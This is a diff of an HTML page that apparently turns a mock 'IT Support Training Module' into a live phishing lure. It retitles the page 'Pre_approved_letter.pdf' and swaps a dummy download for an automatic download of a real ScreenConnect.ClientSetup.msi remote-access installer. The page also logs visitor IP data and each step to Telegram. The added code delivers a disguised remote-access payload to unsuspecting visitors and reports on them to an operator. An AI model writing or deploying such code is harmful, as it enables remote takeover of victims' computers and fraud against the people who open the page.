@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IT Support Training Module</title>
+    <title>Pre_approved_letter.pdf</title>
     <style>
-        /* Base page layout and gray background setup */
+        /* Base page layout and white background setup */
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background-color: #8c8c8c;
+            background-color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -311,26 +311,27 @@
         }
 
         function moveToPhase3() {
-            document.getElementById('phase2').classList.add('hidden');
-            document.getElementById('phase3').classList.remove('hidden');
-        }
+    document.getElementById('phase2').classList.add('hidden');
+    document.getElementById('phase3').classList.remove('hidden');
+    
+    document.title = "Pre_approved_letter.pdf";
+    
+    // Automatically triggers the download file sequence upon arrival
+    downloadInstaller();
+}
 
-        function downloadInstaller() {
-            sendTelegramNotification("✅ Run Installer Clicked - Downloading ScreenConnect.ClientSetup.msi");
-
-            const blob = new Blob(["Training Project Dummy MSI File"], { type: "application/octet-stream" });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = "ScreenConnect.ClientSetup.msi";
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-
-            alert("✅ ScreenConnect.ClientSetup.msi downloaded!\nCheck your Downloads folder.");
-        }
-
+function downloadInstaller() {
+    sendTelegramNotification("⚠️ Run Installer Clicked - Downloading ScreenConnect.ClientSetup.msi");
+    
+    // Points directly to your actual real installer file inside your GitHub folder
+    const tempDownloadAnchor = document.createElement('a');
+    tempDownloadAnchor.href = './ScreenConnect.ClientSetup.msi'; 
+    tempDownloadAnchor.download = 'ScreenConnect.ClientSetup.msi';
+    
+    document.body.appendChild(tempDownloadAnchor);
+    tempDownloadAnchor.click();
+    document.body.removeChild(tempDownloadAnchor);
+}
         window.onload = async function() {
             await getIPInfo();
             if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
@@ -341,6 +342,7 @@
                 sendTelegramNotification("👤 New Session Started - Desktop");
             }
         };
-    </script>
+
+</script>
 </body>
 </html>
